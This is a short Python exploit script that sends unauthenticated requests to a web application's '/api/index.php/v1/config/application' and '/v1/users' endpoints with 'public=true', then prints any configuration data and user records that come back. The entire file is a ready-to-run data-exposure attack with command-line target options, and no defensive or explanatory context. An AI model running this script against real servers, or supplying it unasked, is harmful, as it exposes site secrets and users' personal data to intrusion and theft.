import requests
import sys
import argparse

def exploit_config(host):
    url = f"http://{host}:{port}/api/index.php/v1/config/application?public=true"
    
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print("[+] Configuration data exposed:")
            print(response.text)
        else:
            print(f"[-] Failed to retrieve configuration data. Status Code: {response.status_code}")
    except Exception as e:
        print(f"[-] Error occurred: {e}")


def exploit_users(ip_address):
    url = f"http://{host}:{port}/api/index.php/v1/users?public=true"
    
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print("[+] User information exposed:")
            print(response.text)
        else:
            print(f"[-] Failed to retrieve user data. Status Code: {response.status_code}")
    except Exception as e:
        print(f"[-] Error occurred: {e}")

if __name__ == "__main__":
    # Set up argument parsing
    parser = argparse.ArgumentParser(description="Attempt to access sensitive files via various plugins.")
    parser.add_argument('--host', type=str, default='localhost', help='Target host (default: localhost)')
    parser.add_argument('--port', type=str, default='8080', help='Target port (default: 8080)')

    args = parser.parse_args()

    # Use arguments from CLI or default values
    host = args.host
    port = args.port

    print(f"[*] Target IP address: {host}")
    
    print("\n[*] Exploiting Configuration Data Exposure...")
    exploit_config(host)

    print("\n[*] Exploiting User Data Exposure...")
    exploit_users(host)
